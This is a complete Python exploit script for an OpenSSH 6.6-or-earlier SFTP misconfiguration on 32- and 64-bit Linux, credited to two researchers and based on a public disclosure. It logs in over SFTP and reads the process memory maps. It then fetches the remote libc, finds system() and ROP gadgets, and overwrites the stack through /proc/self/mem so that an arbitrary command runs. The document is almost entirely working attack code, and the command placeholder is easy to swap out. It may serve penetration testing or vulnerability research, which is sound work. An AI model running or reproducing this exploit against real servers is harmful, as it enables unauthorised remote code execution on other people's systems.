# OpenSSH <= 6.6 SFTP misconfiguration exploit for 32/64bit Linux
# The original discovery by Jann Horn: http://seclists.org/fulldisclosure/2014/Oct/35
#
# Adam Simuntis :: https://twitter.com/adamsimuntis
# Mindaugas Slusnys :: https://twitter.com/mislusnys

import paramiko
import sys
import time
from pwn import *

# parameters
cmd = 'touch /tmp/pwn; touch /tmp/pwn2'
host = '172.16.15.59'
port = 22
username = 'secforce'
password = 'secforce'

# connection
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname = host, port = port, username = username, password = password)
sftp = ssh.open_sftp()

# parse /proc/self/maps to get addresses
log.info("Analysing /proc/self/maps on remote system")
sftp.get('/proc/self/maps','maps')
with open("maps","r") as f:
    lines = f.readlines()
    for line in lines:
        words = line.split()
        addr = words[0]
        if ("libc" in line and "r-xp" in line):
            path = words[-1]
            addr = addr.split('-')
            BITS = 64 if len(addr[0]) > 8 else 32
            print "[+] {}bit libc mapped @ {}-{}, path: {}".format(BITS, addr[0], addr[1], path)
            libc_base = int(addr[0], 16)
            libc_path = path
        if ("[stack]" in line):
            addr = addr.split("-")
            saddr_start = int(addr[0], 16)
            saddr_end = int(addr[1], 16)
            print "[+] Stack mapped @ {}-{}".format(addr[0], addr[1])

# download remote libc and extract information
print "[+] Fetching libc from remote system..\n"
sftp.get(str(libc_path), 'libc.so')
e = ELF("libc.so")
sys_addr = libc_base + e.symbols['system']
exit_addr = libc_base + e.symbols['exit']

# gadgets for the RET slide and system()
if BITS == 64:
    pop_rdi_ret = libc_base + next(e.search('\x5f\xc3'))
    ret_addr = pop_rdi_ret + 1
else:
    ret_addr = libc_base + next(e.search('\xc3'))

print "\n[+] system()  @ {}".format(hex(sys_addr))
print "[+] 'ret' @ {}".format(hex(ret_addr))
if BITS == 64:
    print "[+] 'pop rdi; ret' @ {}\n".format(hex(pop_rdi_ret))

with sftp.open('/proc/self/mem','rw') as f:
    if f.writable():
        print "[+] We have r/w permissions for /proc/self/mem! All Good."
    else:
        print "[-] Fatal error. No r/w permission for mem."
        sys.exit(0)

    log.info("Patching /proc/self/mem on the remote system")

    stack_size = saddr_end - saddr_start
    new_stack = ""

    print "[+] Pushing new stack to {}.. fingers crossed ;))".format(hex(saddr_start))
    #sleep(20)
    if BITS == 32:
        new_stack += p32(ret_addr) * (stack_size/4)
        new_stack = cmd + "\x00" + new_stack[len(cmd)+1:-12]
        new_stack += p32(sys_addr)
        new_stack += p32(exit_addr)
        new_stack += p32(saddr_start)
    else:
        new_stack += p64(ret_addr) * (stack_size/8)
        new_stack = cmd + "\x00" + new_stack[len(cmd)+1:-32]
        new_stack += p64(pop_rdi_ret)
        new_stack += p64(saddr_start)
        new_stack += p64(sys_addr)
        new_stack += p64(exit_addr)

    # debug info
    with open("fake_stack","w") as lg:
        lg.write(new_stack)

    # write cmd to top off the stack
    f.seek(saddr_start)
    f.write(cmd + "\x00")

    # write the rest from bottom up, we're going to crash at some point
    for off in range(stack_size - 32000, 0, -32000):
        cur_addr = saddr_start + off

        try:
            f.seek(cur_addr)
            f.write(new_stack[off:off+32000])
        except:
            print "Stack write failed - that's probably good!"
            print "Check if you command was executed..."
            sys.exit(0)

sftp.close()
ssh.close()